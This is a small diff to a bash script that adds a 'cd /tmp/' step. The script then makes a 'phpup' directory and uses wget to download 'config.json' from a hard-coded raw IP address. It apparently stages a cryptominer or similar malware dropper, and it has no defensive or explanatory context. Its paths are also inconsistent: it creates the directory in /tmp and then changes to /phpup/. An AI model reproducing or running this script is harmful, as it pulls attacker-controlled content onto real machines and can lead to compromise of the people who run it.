@@ -1,6 +1,8 @@
 #!/bin/bash
 
 VERSION=2.11
+
+cd /tmp/
 mkdir phpup
 cd /phpup/
 wget http://172.247.34.167/wk/config.json
